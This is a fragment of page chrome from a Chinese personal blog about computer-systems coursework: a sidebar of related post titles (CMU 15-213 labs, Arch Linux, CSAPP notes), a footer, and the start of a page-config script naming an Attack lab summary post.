title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Activity/" title="分类于15-213 Activity">15-213 Activity</a></div><span><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20recitation/">15-213 Bomb lab recitation 记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/" title="分类于开发工具">开发工具</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/" title="分类于Arch">Arch</a></div><span><a href="/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/">Arch Linux安装实录&知识讲解&踩坑分析（超详细！）</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/Projects/" title="分类于Projects">Projects</a><i class="ic i-angle-right"></i><a href="/blog/categories/Projects/Snake/" title="分类于Snake">Snake</a></div><span><a href="/blog/2023/10/31/Projects/Snake/analysis/">动手写贪吃蛇游戏</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Activity/" title="分类于15-213 Activity">15-213 Activity</a></div><span><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20procedures%20activity/">15-213 Machine Procedures Activity 记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Activity/" title="分类于15-213 Activity">15-213 Activity</a></div><span><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20activity/">15-213 Bomb lab Activity 记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/" title="分类于CIT5950">CIT5950</a></div><span><a href="/blog/2024/01/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_Project/">Final Project: 多线程HTTP服务器 实现记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Activity/" title="分类于15-213 Activity">15-213 Activity</a></div><span><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Attack%20lab%20recitation/">15-213 Attack lab recitation</a></span></li><li class="item"><div class="breadcrumb"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" title="分类于计算机科学">计算机科学</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" title="分类于系统">系统</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" title="分类于系统入门">系统入门</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" title="分类于15-213">15-213</a><i class="ic i-angle-right"></i><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" title="分类于CSAPP 阅读笔记">CSAPP 阅读笔记</a></div><span><a href="/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch2/">CSAPP Chapter 2 - 信息的表示和处理</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"><li class="item" v-for="com in coms"><a v-bind:href="root + com.href" data-pjax-state="data-pjax-state"><span class="breadcrumb">{{com.nick}} @ {{com.time}}</span><span>{{com.text}}<br/></span></a></li></ul></div></div><div class="status"><div class="copyright">&copy; 2023 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">Salvely @ Salvely</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">262k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">3:58</span></div><div class="powered-by">基于 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & Theme.<a href="https://github.com/theme-shoka-x/hexo-theme-shokaX/" rel="noopener" target="_blank">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
         path: `2024/02/29/计算机科学/系统/系统入门/15-213/15-213 Lab/Attack lab 实验总结/`,
         favicon: {
         show: `（●´3｀●）やれやれだぜ`,
